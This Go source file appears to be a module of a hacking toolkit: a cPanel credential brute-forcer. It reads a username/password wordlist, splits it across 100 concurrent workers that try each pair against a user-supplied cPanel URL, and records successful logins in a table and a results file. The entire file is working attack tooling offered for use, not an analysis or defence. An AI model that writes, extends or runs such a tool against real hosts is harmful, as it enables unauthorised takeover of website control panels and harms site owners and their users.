package cpanelbrute

import (
	"fmt"
	"go_cli/smtpbrute"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/ncruces/zenity"
	"github.com/olekukonko/tablewriter"
)

func CpanelCrack() {
	var target string
	fmt.Println("Enter the CPanel Domain (example: https://website.com:2083/)")
	fmt.Print(">>> ")
	fmt.Scanln(&target)
	trimedTarget := strings.TrimSpace(target)
	validateTarget, err := regexp.Match(`https?://[^:]+:(\d+)/\z`, []byte(trimedTarget))
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	if !validateTarget {
		fmt.Println("invalid domain format!")
		return
	}

	fmt.Println("Select your wordlist: ")
	filePath, err := zenity.SelectFile(
		zenity.FileFilters{
			{Patterns: []string{"*.txt"}, CaseFold: false},
		})
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	fmt.Printf("filePath: %v\n", filePath)
	wordlist, err := smtpbrute.ReadCredsFromFile(filePath)
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	fmt.Printf("Total Credentials: %v\n", len(wordlist))

	maxWorkers := 100
	chunkSize := len(wordlist) / maxWorkers

	if len(wordlist)%maxWorkers != 0 {
		chunkSize++
	}

	wordlistChunks := make(chan []string, chunkSize)

	var mutex sync.Mutex
	var wg sync.WaitGroup
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"Domain", "Username", "Password"})

	file := ResultsToFile()

	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go HandleBrute(trimedTarget, wordlistChunks, &wg, &mutex, table, &file)
	}

	for i := 0; i < len(wordlist); i += chunkSize {
		end := i + chunkSize
		if end > len(wordlist) {
			end = len(wordlist)
		}
		wordlistChunks <- wordlist[i:end]
	}
	fmt.Printf("len(wordlistChunks): %v\n", len(wordlistChunks))
	close(wordlistChunks)
	wg.Wait()
	fmt.Println("all checks are done!")
}
